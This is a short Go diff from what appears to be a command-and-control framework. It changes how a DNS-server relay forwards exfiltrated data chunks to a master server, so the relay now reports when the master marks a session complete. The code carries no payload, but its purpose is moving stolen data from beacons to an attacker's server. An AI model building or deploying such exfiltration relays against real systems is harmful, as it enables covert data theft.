@@ -439,25 +439,35 @@ func (mc *MasterClient) SubmitResult(taskID, beaconID string, chunkIndex, totalC
 }
 
 // SubmitExfilChunk forwards a dedicated exfil client chunk to the Master Server
-func (mc *MasterClient) SubmitExfilChunk(req ExfilChunkRequest) error {
+func (mc *MasterClient) SubmitExfilChunk(req ExfilChunkRequest) (bool, error) {
 	req.DNSServerID = mc.serverID
 	req.APIKey = mc.apiKey
 
 	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/chunk", req)
 	if err != nil {
-		return fmt.Errorf("exfil chunk submit failed: %w", err)
+		return false, fmt.Errorf("exfil chunk submit failed: %w", err)
 	}
 
 	var resp APIResponse
 	if err := json.Unmarshal(respData, &resp); err != nil {
-		return fmt.Errorf("failed to parse exfil chunk response: %w", err)
+		return false, fmt.Errorf("failed to parse exfil chunk response: %w", err)
 	}
 
 	if !resp.Success {
-		return fmt.Errorf("exfil chunk rejected: %s", resp.Message)
+		return false, fmt.Errorf("exfil chunk rejected: %s", resp.Message)
 	}
 
-	return nil
+	// Check if session is complete (Master signals this after receiving all chunks)
+	sessionComplete := false
+	if dataMap, ok := resp.Data.(map[string]interface{}); ok {
+		if complete, exists := dataMap["completed"]; exists {
+			if completeBool, ok := complete.(bool); ok {
+				sessionComplete = completeBool
+			}
+		}
+	}
+
+	return sessionComplete, nil
 }
 
 // MarkExfilComplete notifies the Master Server that a session finished transferring
